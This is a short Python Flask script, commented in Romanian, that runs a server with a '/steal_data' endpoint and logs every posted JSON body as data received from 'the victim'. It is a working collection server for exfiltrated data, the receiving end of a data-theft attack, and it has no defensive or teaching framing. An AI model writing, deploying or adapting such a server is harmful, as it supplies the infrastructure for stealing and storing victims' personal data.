from flask import Flask, request
import logging

app = Flask(__name__)

# Configurare logger
logging.basicConfig(filename='server.log', level=logging.DEBUG, format='%(asctime)s %(message)s')

@app.route('/steal_data', methods=['POST'])
def steal_data():
    data = request.json
    app.logger.info(f'Date primite de la victimă: {data}')
    return 'Data received', 200

if __name__ == '__main__':
    app.run(port=5000)
